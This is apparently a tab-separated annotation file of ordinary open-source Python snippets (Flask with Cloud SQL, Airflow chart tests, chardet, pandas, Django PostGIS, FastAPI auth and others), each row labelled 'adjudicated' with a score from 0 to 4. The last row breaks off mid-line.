92	adjudicated	2	"# Copyright 2018 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>># [START gae_python38_cloudsql_psql_pooling]<<NEWL>># [START gae_python3_cloudsql_psql_pooling]<<NEWL>>import os<<NEWL>><<NEWL>>from flask import Flask<<NEWL>>import psycopg2.pool<<NEWL>><<NEWL>>db_user = os.environ.get('CLOUD_SQL_USERNAME')<<NEWL>>db_password = os.environ.get('CLOUD_SQL_PASSWORD')<<NEWL>>db_name = os.environ.get('CLOUD_SQL_DATABASE_NAME')<<NEWL>>db_connection_name = os.environ.get('CLOUD_SQL_CONNECTION_NAME')<<NEWL>><<NEWL>># When deployed to App Engine, the `GAE_ENV` environment variable will be<<NEWL>># set to `standard`<<NEWL>>if os.environ.get('GAE_ENV') == 'standard':<<NEWL>>    # If deployed, use the local socket interface for accessing Cloud SQL<<NEWL>>    host = '/cloudsql/{}'.format(db_connection_name)<<NEWL>>else:<<NEWL>>    # If running locally, use the TCP connections instead<<NEWL>>    # Set up Cloud SQL Proxy (cloud.google.com/sql/docs/mysql/sql-proxy)<<NEWL>>    # so that your application can use 127.0.0.1:3306 to connect to your<<NEWL>>    # Cloud SQL instance<<NEWL>>    host = '127.0.0.1'<<NEWL>><<NEWL>>db_config = {<<NEWL>>    'user': db_user,<<NEWL>>    'password': db_password,<<NEWL>>    'database': db_name,<<NEWL>>    'host': host<<NEWL>>}<<NEWL>><<NEWL>>cnxpool = psycopg2.pool.ThreadedConnectionPool(minconn=1, maxconn=3,<<NEWL>>                                               **db_config)<<NEWL>><<NEWL>>app = Flask(__name__)<<NEWL>><<NEWL>><<NEWL>>@app.route('/')<<NEWL>>def main():<<NEWL>>    cnx = cnxpool.getconn()<<NEWL>>    with cnx.cursor() as cursor:<<NEWL>>        cursor.execute('SELECT NOW() as now;')<<NEWL>>        result = cursor.fetchall()<<NEWL>>    current_time = result[0][0]<<NEWL>>    cnx.commit()<<NEWL>>    cnxpool.putconn(cnx)<<NEWL>><<NEWL>>    return str(current_time)<<NEWL>># [END gae_python3_cloudsql_psql_pooling]<<NEWL>># [END gae_python38_cloudsql_psql_pooling]<<NEWL>><<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    app.run(host='127.0.0.1', port=8080, debug=True)"
303	adjudicated	4	"#  Copyright 2022 Google LLC<<NEWL>>#<<NEWL>>#  Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>>#  you may not use this file except in compliance with the License.<<NEWL>>#  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>>#  Unless required by applicable law or agreed to in writing, software<<NEWL>>#  distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>>#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>>#  See the License for the specific language governing permissions and<<NEWL>>#  limitations under the License.<<NEWL>><<NEWL>><<NEWL>># This is an ingredient file. It is not meant to be run directly. Check the samples/snippets<<NEWL>># folder for complete code samples that are ready to be used.<<NEWL>># Disabling flake8 for the ingredients file, as it would fail F821 - undefined name check.<<NEWL>># flake8: noqa<<NEWL>>from google.cloud import compute_v1<<NEWL>><<NEWL>><<NEWL>># <INGREDIENT set_deprecation_status><<NEWL>>def set_deprecation_status(project_id: str, image_name: str, status: compute_v1.DeprecationStatus.State) -> None:<<NEWL>>    """"""<<NEWL>>    Modify the deprecation status of an image.<<NEWL>><<NEWL>>    Note: Image objects by default don't have the `deprecated` attribute at all unless it's set.<<NEWL>><<NEWL>>    Args:<<NEWL>>        project_id: project ID or project number of the Cloud project that hosts the image.<<NEWL>>        image_name: name of the image you want to modify<<NEWL>>        status: the status you want to set for the image. Available values are available in<<NEWL>>            `compute_v1.DeprecationStatus.State` enum. Learn more about image deprecation statuses:<<NEWL>>            https://cloud.google.com/compute/docs/images/create-delete-deprecate-private-images#deprecation-states<<NEWL>>    """"""<<NEWL>>    image_client = compute_v1.ImagesClient()<<NEWL>>    deprecation_status = compute_v1.DeprecationStatus()<<NEWL>>    deprecation_status.state = status.name<<NEWL>>    operation = image_client.deprecate(project=project_id, image=image_name,<<NEWL>>                                       deprecation_status_resource=deprecation_status)<<NEWL>><<NEWL>>    wait_for_extended_operation(operation, ""changing deprecation state of an image"")<<NEWL>># </INGREDIENT>"
4	adjudicated	0	"# Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>>from __future__ import annotations<<NEWL>><<NEWL>>import jmespath<<NEWL>>import pytest<<NEWL>><<NEWL>>from tests.charts.helm_template_generator import render_chart<<NEWL>><<NEWL>><<NEWL>>class TestPodLauncher:<<NEWL>>    @pytest.mark.parametrize(<<NEWL>>        ""executor, rbac, allow, expected_accounts"",<<NEWL>>        [<<NEWL>>            (""CeleryKubernetesExecutor"", True, True, [""scheduler"", ""worker""]),<<NEWL>>            (""KubernetesExecutor"", True, True, [""scheduler"", ""worker""]),<<NEWL>>            (""CeleryExecutor"", True, True, [""worker""]),<<NEWL>>            (""LocalExecutor"", True, True, [""scheduler""]),<<NEWL>>            (""LocalExecutor"", False, False, []),<<NEWL>>        ],<<NEWL>>    )<<NEWL>>    def test_pod_launcher_role(self, executor, rbac, allow, expected_accounts):<<NEWL>>        docs = render_chart(<<NEWL>>            values={<<NEWL>>                ""rbac"": {""create"": rbac},<<NEWL>>                ""allowPodLaunching"": allow,<<NEWL>>                ""executor"": executor,<<NEWL>>            },<<NEWL>>            show_only=[""templates/rbac/pod-launcher-rolebinding.yaml""],<<NEWL>>        )<<NEWL>>        if expected_accounts:<<NEWL>>            for idx, suffix in enumerate(expected_accounts):<<NEWL>>                assert f""release-name-airflow-{suffix}"" == jmespath.search(f""subjects[{idx}].name"", docs[0])<<NEWL>>        else:<<NEWL>>            assert [] == docs"
395	adjudicated	0	# -*- coding: utf-8 -*-<<NEWL>># Copyright (C) 2006-2007 SÃ¸ren Roug, European Environment Agency<<NEWL>>#<<NEWL>># This library is free software; you can redistribute it and/or<<NEWL>># modify it under the terms of the GNU Lesser General Public<<NEWL>># License as published by the Free Software Foundation; either<<NEWL>># version 2.1 of the License, or (at your option) any later version.<<NEWL>>#<<NEWL>># This library is distributed in the hope that it will be useful,<<NEWL>># but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU<<NEWL>># Lesser General Public License for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU Lesser General Public<<NEWL>># License along with this library; if not, write to the Free Software<<NEWL>># Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA<<NEWL>>#<<NEWL>># Contributor(s):<<NEWL>>#<<NEWL>><<NEWL>>from odf.namespaces import ANIMNS<<NEWL>>from odf.element import Element<<NEWL>><<NEWL>><<NEWL>># Autogenerated<<NEWL>>def Animate(**args):<<NEWL>>    return Element(qname = (ANIMNS,'animate'), **args)<<NEWL>><<NEWL>>def Animatecolor(**args):<<NEWL>>    return Element(qname = (ANIMNS,'animateColor'), **args)<<NEWL>><<NEWL>>def Animatemotion(**args):<<NEWL>>    return Element(qname = (ANIMNS,'animateMotion'), **args)<<NEWL>><<NEWL>>def Animatetransform(**args):<<NEWL>>    return Element(qname = (ANIMNS,'animateTransform'), **args)<<NEWL>><<NEWL>>def Audio(**args):<<NEWL>>    return Element(qname = (ANIMNS,'audio'), **args)<<NEWL>><<NEWL>>def Command(**args):<<NEWL>>    return Element(qname = (ANIMNS,'command'), **args)<<NEWL>><<NEWL>>def Iterate(**args):<<NEWL>>    return Element(qname = (ANIMNS,'iterate'), **args)<<NEWL>><<NEWL>>def Par(**args):<<NEWL>>    return Element(qname = (ANIMNS,'par'), **args)<<NEWL>><<NEWL>>def Param(**args):<<NEWL>>    return Element(qname = (ANIMNS,'param'), **args)<<NEWL>><<NEWL>>def Seq(**args):<<NEWL>>    return Element(qname = (ANIMNS,'seq'), **args)<<NEWL>><<NEWL>>def Set(**args):<<NEWL>>    return Element(qname = (ANIMNS,'set'), **args)<<NEWL>><<NEWL>>def Transitionfilter(**args):<<NEWL>>    return Element(qname = (ANIMNS,'transitionFilter'), **args)<<NEWL>>
144	adjudicated	0	######################## BEGIN LICENSE BLOCK ########################<<NEWL>># The Original Code is Mozilla Universal charset detector code.<<NEWL>>#<<NEWL>># The Initial Developer of the Original Code is<<NEWL>># Netscape Communications Corporation.<<NEWL>># Portions created by the Initial Developer are Copyright (C) 2001<<NEWL>># the Initial Developer. All Rights Reserved.<<NEWL>>#<<NEWL>># Contributor(s):<<NEWL>>#   Mark Pilgrim - port to Python<<NEWL>>#   Shy Shalom - original C code<<NEWL>>#   Proofpoint, Inc.<<NEWL>>#<<NEWL>># This library is free software; you can redistribute it and/or<<NEWL>># modify it under the terms of the GNU Lesser General Public<<NEWL>># License as published by the Free Software Foundation; either<<NEWL>># version 2.1 of the License, or (at your option) any later version.<<NEWL>>#<<NEWL>># This library is distributed in the hope that it will be useful,<<NEWL>># but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU<<NEWL>># Lesser General Public License for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU Lesser General Public<<NEWL>># License along with this library; if not, write to the Free Software<<NEWL>># Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA<<NEWL>># 02110-1301  USA<<NEWL>>######################### END LICENSE BLOCK #########################<<NEWL>><<NEWL>>from .charsetgroupprober import CharSetGroupProber<<NEWL>>from .utf8prober import UTF8Prober<<NEWL>>from .sjisprober import SJISProber<<NEWL>>from .eucjpprober import EUCJPProber<<NEWL>>from .gb2312prober import GB2312Prober<<NEWL>>from .euckrprober import EUCKRProber<<NEWL>>from .cp949prober import CP949Prober<<NEWL>>from .big5prober import Big5Prober<<NEWL>>from .euctwprober import EUCTWProber<<NEWL>><<NEWL>><<NEWL>>class MBCSGroupProber(CharSetGroupProber):<<NEWL>>    def __init__(self, lang_filter=None):<<NEWL>>        super(MBCSGroupProber, self).__init__(lang_filter=lang_filter)<<NEWL>>        self.probers = [<<NEWL>>            UTF8Prober(),<<NEWL>>            SJISProber(),<<NEWL>>            EUCJPProber(),<<NEWL>>            GB2312Prober(),<<NEWL>>            EUCKRProber(),<<NEWL>>            CP949Prober(),<<NEWL>>            Big5Prober(),<<NEWL>>            EUCTWProber(),<<NEWL>>        ]<<NEWL>>        self.reset()
55	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""textfont"", parent_name=""funnel"", **kwargs):<<NEWL>>        super(TextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
115	adjudicated	1	"from fastapi import APIRouter, Depends, HTTPException<<NEWL>>from fastapi.security import OAuth2PasswordRequestForm<<NEWL>>from starlette import status<<NEWL>><<NEWL>>from app.repository.users_repository import UsersRepository<<NEWL>>from app.repository.unit_of_work import UnitOfWork<<NEWL>>from app.users_service.users_service import UsersService<<NEWL>>from app.users_service.users import User<<NEWL>>from app.web.api.schemas import UserRegisterInSchema, UserOutSchema, Token<<NEWL>>from app.web.api.auth import authenticate_user, issue_new_token, get_current_user<<NEWL>><<NEWL>>router = APIRouter(tags=[""auth""])<<NEWL>><<NEWL>><<NEWL>>@router.post(<<NEWL>>    ""/register"", status_code=status.HTTP_201_CREATED, response_model=UserOutSchema<<NEWL>>)<<NEWL>>async def register(payload: UserRegisterInSchema):<<NEWL>>    with UnitOfWork() as unit_of_work:<<NEWL>>        repo = UsersRepository(unit_of_work.session)<<NEWL>>        users_service = UsersService(repo)<<NEWL>>        # user ID didn't exist before commit<<NEWL>>        # we have to get it now when the SQLAlchemy session is still active.<<NEWL>>        user_data = payload.dict()<<NEWL>>        del user_data[""password_confirm""]<<NEWL>>        user = users_service.add_user(**user_data)<<NEWL>>        unit_of_work.commit()<<NEWL>>        res = user.dict()<<NEWL>>    return res<<NEWL>><<NEWL>><<NEWL>>@router.post(""/token"", response_model=Token)<<NEWL>>async def login_for_access_token(form_data: OAuth2PasswordRequestForm = Depends()):<<NEWL>>    user = authenticate_user(form_data.username, form_data.password)<<NEWL>>    if not user:<<NEWL>>        raise HTTPException(<<NEWL>>            status_code=status.HTTP_401_UNAUTHORIZED,<<NEWL>>            detail=""Incorrect username or password"",<<NEWL>>            headers={""WWW-Authenticate"": ""Bearer""},<<NEWL>>        )<<NEWL>>    token = issue_new_token(user)<<NEWL>>    return token<<NEWL>><<NEWL>><<NEWL>>@router.get(""/current_user"", response_model=UserOutSchema)<<NEWL>>async def get_current_user(current_user: User = Depends(get_current_user)):<<NEWL>>    return current_user.dict()"
284	adjudicated	2	"""""""<<NEWL>> The GeometryColumns and SpatialRefSys models for the PostGIS backend.<<NEWL>>""""""<<NEWL>>from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin<<NEWL>>from django.db import models<<NEWL>><<NEWL>><<NEWL>>class PostGISGeometryColumns(models.Model):<<NEWL>>    """"""<<NEWL>>    The 'geometry_columns' view from PostGIS. See the PostGIS<<NEWL>>    documentation at Ch. 4.3.2.<<NEWL>>    """"""<<NEWL>>    f_table_catalog = models.CharField(max_length=256)<<NEWL>>    f_table_schema = models.CharField(max_length=256)<<NEWL>>    f_table_name = models.CharField(max_length=256)<<NEWL>>    f_geometry_column = models.CharField(max_length=256)<<NEWL>>    coord_dimension = models.IntegerField()<<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    type = models.CharField(max_length=30)<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = 'gis'<<NEWL>>        db_table = 'geometry_columns'<<NEWL>>        managed = False<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return '%s.%s - %dD %s field (SRID: %d)' % (<<NEWL>>            self.f_table_name,<<NEWL>>            self.f_geometry_column,<<NEWL>>            self.coord_dimension,<<NEWL>>            self.type,<<NEWL>>            self.srid,<<NEWL>>        )<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def table_name_col(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature table<<NEWL>>        name.<<NEWL>>        """"""<<NEWL>>        return 'f_table_name'<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def geom_col_name(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature<<NEWL>>        geometry column.<<NEWL>>        """"""<<NEWL>>        return 'f_geometry_column'<<NEWL>><<NEWL>><<NEWL>>class PostGISSpatialRefSys(models.Model, SpatialRefSysMixin):<<NEWL>>    """"""<<NEWL>>    The 'spatial_ref_sys' table from PostGIS. See the PostGIS<<NEWL>>    documentation at Ch. 4.2.1.<<NEWL>>    """"""<<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    auth_name = models.CharField(max_length=256)<<NEWL>>    auth_srid = models.IntegerField()<<NEWL>>    srtext = models.CharField(max_length=2048)<<NEWL>>    proj4text = models.CharField(max_length=2048)<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = 'gis'<<NEWL>>        db_table = 'spatial_ref_sys'<<NEWL>>        managed = False<<NEWL>><<NEWL>>    @property<<NEWL>>    def wkt(self):<<NEWL>>        return self.srtext"
337	adjudicated	0	######################## BEGIN LICENSE BLOCK ########################<<NEWL>># The Original Code is Mozilla Universal charset detector code.<<NEWL>>#<<NEWL>># The Initial Developer of the Original Code is<<NEWL>># Netscape Communications Corporation.<<NEWL>># Portions created by the Initial Developer are Copyright (C) 2001<<NEWL>># the Initial Developer. All Rights Reserved.<<NEWL>>#<<NEWL>># Contributor(s):<<NEWL>>#   Mark Pilgrim - port to Python<<NEWL>>#   Shy Shalom - original C code<<NEWL>>#   Proofpoint, Inc.<<NEWL>>#<<NEWL>># This library is free software; you can redistribute it and/or<<NEWL>># modify it under the terms of the GNU Lesser General Public<<NEWL>># License as published by the Free Software Foundation; either<<NEWL>># version 2.1 of the License, or (at your option) any later version.<<NEWL>>#<<NEWL>># This library is distributed in the hope that it will be useful,<<NEWL>># but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU<<NEWL>># Lesser General Public License for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU Lesser General Public<<NEWL>># License along with this library; if not, write to the Free Software<<NEWL>># Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA<<NEWL>># 02110-1301  USA<<NEWL>>######################### END LICENSE BLOCK #########################<<NEWL>><<NEWL>>from .charsetgroupprober import CharSetGroupProber<<NEWL>>from .utf8prober import UTF8Prober<<NEWL>>from .sjisprober import SJISProber<<NEWL>>from .eucjpprober import EUCJPProber<<NEWL>>from .gb2312prober import GB2312Prober<<NEWL>>from .euckrprober import EUCKRProber<<NEWL>>from .cp949prober import CP949Prober<<NEWL>>from .big5prober import Big5Prober<<NEWL>>from .euctwprober import EUCTWProber<<NEWL>><<NEWL>><<NEWL>>class MBCSGroupProber(CharSetGroupProber):<<NEWL>>    def __init__(self, lang_filter=None):<<NEWL>>        super(MBCSGroupProber, self).__init__(lang_filter=lang_filter)<<NEWL>>        self.probers = [<<NEWL>>            UTF8Prober(),<<NEWL>>            SJISProber(),<<NEWL>>            EUCJPProber(),<<NEWL>>            GB2312Prober(),<<NEWL>>            EUCKRProber(),<<NEWL>>            CP949Prober(),<<NEWL>>            Big5Prober(),<<NEWL>>            EUCTWProber()<<NEWL>>        ]<<NEWL>>        self.reset()
277	adjudicated	4	"from __future__ import annotations<<NEWL>><<NEWL>>import numpy as np<<NEWL>><<NEWL>>from pandas._typing import NumpyIndexT<<NEWL>><<NEWL>>from pandas.core.dtypes.common import is_list_like<<NEWL>><<NEWL>><<NEWL>>def cartesian_product(X) -> list[np.ndarray]:<<NEWL>>    """"""<<NEWL>>    Numpy version of itertools.product.<<NEWL>>    Sometimes faster (for large inputs)...<<NEWL>><<NEWL>>    Parameters<<NEWL>>    ----------<<NEWL>>    X : list-like of list-likes<<NEWL>><<NEWL>>    Returns<<NEWL>>    -------<<NEWL>>    product : list of ndarrays<<NEWL>><<NEWL>>    Examples<<NEWL>>    --------<<NEWL>>    >>> cartesian_product([list('ABC'), [1, 2]])<<NEWL>>    [array(['A', 'A', 'B', 'B', 'C', 'C'], dtype='<U1'), array([1, 2, 1, 2, 1, 2])]<<NEWL>><<NEWL>>    See Also<<NEWL>>    --------<<NEWL>>    itertools.product : Cartesian product of input iterables.  Equivalent to<<NEWL>>        nested for-loops.<<NEWL>>    """"""<<NEWL>>    msg = ""Input must be a list-like of list-likes""<<NEWL>>    if not is_list_like(X):<<NEWL>>        raise TypeError(msg)<<NEWL>>    for x in X:<<NEWL>>        if not is_list_like(x):<<NEWL>>            raise TypeError(msg)<<NEWL>><<NEWL>>    if len(X) == 0:<<NEWL>>        return []<<NEWL>><<NEWL>>    lenX = np.fromiter((len(x) for x in X), dtype=np.intp)<<NEWL>>    cumprodX = np.cumproduct(lenX)<<NEWL>><<NEWL>>    if np.any(cumprodX < 0):<<NEWL>>        raise ValueError(""Product space too large to allocate arrays!"")<<NEWL>><<NEWL>>    a = np.roll(cumprodX, 1)<<NEWL>>    a[0] = 1<<NEWL>><<NEWL>>    if cumprodX[-1] != 0:<<NEWL>>        b = cumprodX[-1] / cumprodX<<NEWL>>    else:<<NEWL>>        # if any factor is empty, the cartesian product is empty<<NEWL>>        b = np.zeros_like(cumprodX)<<NEWL>><<NEWL>>    # error: Argument of type ""int_"" cannot be assigned to parameter ""num"" of<<NEWL>>    # type ""int"" in function ""tile_compat""<<NEWL>>    return [<<NEWL>>        tile_compat(<<NEWL>>            np.repeat(x, b[i]),<<NEWL>>            np.product(a[i]),  # pyright: ignore[reportGeneralTypeIssues]<<NEWL>>        )<<NEWL>>        for i, x in enumerate(X)<<NEWL>>    ]<<NEWL>><<NEWL>><<NEWL>>def tile_compat(arr: NumpyIndexT, num: int) -> NumpyIndexT:<<NEWL>>    """"""<<NEWL>>    Index compat for np.tile.<<NEWL>><<NEWL>>    Notes<<NEWL>>    -----<<NEWL>>    Does not support multi-dimensional `num`.<<NEWL>>    """"""<<NEWL>>    if isinstance(arr, np.ndarray):<<NEWL>>        return np.tile(arr, num)<<NEWL>><<NEWL>>    # Otherwise we have an Index<<NEWL>>    taker = np.tile(np.arange(len(arr)), num)<<NEWL>>    return arr.take(taker)"
366	adjudicated	3	"from six import string_types<<NEWL>><<NEWL>>from .base import GraphQLDocument<<NEWL>><<NEWL>># Necessary for static type checking<<NEWL>>if False:  # flake8: noqa<<NEWL>>    from ..type.schema import GraphQLSchema<<NEWL>>    from typing import Any, Optional, Dict, Callable, Union<<NEWL>><<NEWL>><<NEWL>>class GraphQLCompiledDocument(GraphQLDocument):<<NEWL>>    @classmethod<<NEWL>>    def from_code(<<NEWL>>        cls,<<NEWL>>        schema,  # type: GraphQLSchema<<NEWL>>        code,  # type: Union[str, Any]<<NEWL>>        uptodate=None,  # type: Optional[bool]<<NEWL>>        extra_namespace=None,  # type: Optional[Dict[str, Any]]<<NEWL>>    ):<<NEWL>>        # type: (...) -> GraphQLCompiledDocument<<NEWL>>        """"""Creates a GraphQLDocument object from compiled code and the globals.  This<<NEWL>>        is used by the loaders and schema to create a document object.<<NEWL>>        """"""<<NEWL>>        if isinstance(code, string_types):<<NEWL>>            filename = ""<document>""<<NEWL>>            code = compile(code, filename, ""exec"")<<NEWL>>        namespace = {""__file__"": code.co_filename}<<NEWL>>        exec(code, namespace)<<NEWL>>        if extra_namespace:<<NEWL>>            namespace.update(extra_namespace)<<NEWL>>        rv = cls._from_namespace(schema, namespace)<<NEWL>>        # rv._uptodate = uptodate<<NEWL>>        return rv<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def from_module_dict(cls, schema, module_dict):<<NEWL>>        # type: (GraphQLSchema, Dict[str, Any]) -> GraphQLCompiledDocument<<NEWL>>        """"""Creates a template object from a module.  This is used by the<<NEWL>>        module loader to create a document object.<<NEWL>>        """"""<<NEWL>>        return cls._from_namespace(schema, module_dict)<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def _from_namespace(cls, schema, namespace):<<NEWL>>        # type: (GraphQLSchema, Dict[str, Any]) -> GraphQLCompiledDocument<<NEWL>>        document_string = namespace.get(""document_string"", """")  # type: str<<NEWL>>        document_ast = namespace.get(""document_ast"")  # type: ignore<<NEWL>>        execute = namespace[""execute""]  # type: Callable<<NEWL>><<NEWL>>        namespace[""schema""] = schema<<NEWL>>        return cls(<<NEWL>>            schema=schema,<<NEWL>>            document_string=document_string,<<NEWL>>            document_ast=document_ast,  # type: ignore<<NEWL>>            execute=execute,<<NEWL>>        )"
226	adjudicated	2	"# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html<<NEWL>># For details: https://github.com/PyCQA/pylint/blob/main/LICENSE<<NEWL>><<NEWL>>import contextlib<<NEWL>>from typing import Dict, Optional, Type<<NEWL>><<NEWL>>from pylint.testutils.global_test_linter import linter<<NEWL>>from pylint.testutils.unittest_linter import UnittestLinter<<NEWL>>from pylint.utils import ASTWalker<<NEWL>><<NEWL>><<NEWL>>class CheckerTestCase:<<NEWL>>    """"""A base testcase class for unit testing individual checker classes.""""""<<NEWL>><<NEWL>>    CHECKER_CLASS: Optional[Type] = None<<NEWL>>    CONFIG: Dict = {}<<NEWL>><<NEWL>>    def setup_method(self):<<NEWL>>        self.linter = UnittestLinter()<<NEWL>>        self.checker = self.CHECKER_CLASS(self.linter)  # pylint: disable=not-callable<<NEWL>>        for key, value in self.CONFIG.items():<<NEWL>>            setattr(self.checker.config, key, value)<<NEWL>>        self.checker.open()<<NEWL>><<NEWL>>    @contextlib.contextmanager<<NEWL>>    def assertNoMessages(self):<<NEWL>>        """"""Assert that no messages are added by the given method.""""""<<NEWL>>        with self.assertAddsMessages():<<NEWL>>            yield<<NEWL>><<NEWL>>    @contextlib.contextmanager<<NEWL>>    def assertAddsMessages(self, *messages):<<NEWL>>        """"""Assert that exactly the given method adds the given messages.<<NEWL>><<NEWL>>        The list of messages must exactly match *all* the messages added by the<<NEWL>>        method. Additionally, we check to see whether the args in each message can<<NEWL>>        actually be substituted into the message string.<<NEWL>>        """"""<<NEWL>>        yield<<NEWL>>        got = self.linter.release_messages()<<NEWL>>        no_msg = ""No message.""<<NEWL>>        expected = ""\n"".join(repr(m) for m in messages) or no_msg<<NEWL>>        got_str = ""\n"".join(repr(m) for m in got) or no_msg<<NEWL>>        msg = (<<NEWL>>            ""Expected messages did not match actual.\n""<<NEWL>>            f""\nExpected:\n{expected}\n\nGot:\n{got_str}\n""<<NEWL>>        )<<NEWL>>        assert got == list(messages), msg<<NEWL>><<NEWL>>    def walk(self, node):<<NEWL>>        """"""recursive walk on the given node""""""<<NEWL>>        walker = ASTWalker(linter)<<NEWL>>        walker.add_checker(self.checker)<<NEWL>>        walker.walk(node)"
428	adjudicated	1	"# Copyright 2017-present Open Networking Foundation<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>># http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>import structlog<<NEWL>>from enum import Enum<<NEWL>>from google.protobuf.json_format import MessageToDict<<NEWL>>from google.protobuf.message import Message<<NEWL>>from simplejson import dumps<<NEWL>><<NEWL>>from common.event_bus import EventBusClient<<NEWL>>from voltha.core.config.config_proxy import CallbackType<<NEWL>>from voltha.protos import third_party<<NEWL>>from voltha.protos.events_pb2 import ConfigEvent, ConfigEventType<<NEWL>><<NEWL>>IGNORED_CALLBACKS = [CallbackType.PRE_ADD, CallbackType.GET,<<NEWL>>                     CallbackType.POST_LISTCHANGE, CallbackType.PRE_REMOVE,<<NEWL>>                     CallbackType.PRE_UPDATE]<<NEWL>><<NEWL>>log = structlog.get_logger()<<NEWL>><<NEWL>>class ConfigEventBus(object):<<NEWL>><<NEWL>>    __slots__ = (<<NEWL>>        '_event_bus_client',  # The event bus client used to publish events.<<NEWL>>        '_topic'  # the topic to publish to<<NEWL>>    )<<NEWL>><<NEWL>>    def __init__(self):<<NEWL>>        self._event_bus_client = EventBusClient()<<NEWL>>        self._topic = 'model-change-events'<<NEWL>><<NEWL>>    def advertise(self, type, data, hash=None):<<NEWL>>        if type in IGNORED_CALLBACKS:<<NEWL>>            log.info('Ignoring event {} with data {}'.format(type, data))<<NEWL>>            return<<NEWL>><<NEWL>>        if type is CallbackType.POST_ADD:<<NEWL>>            kind = 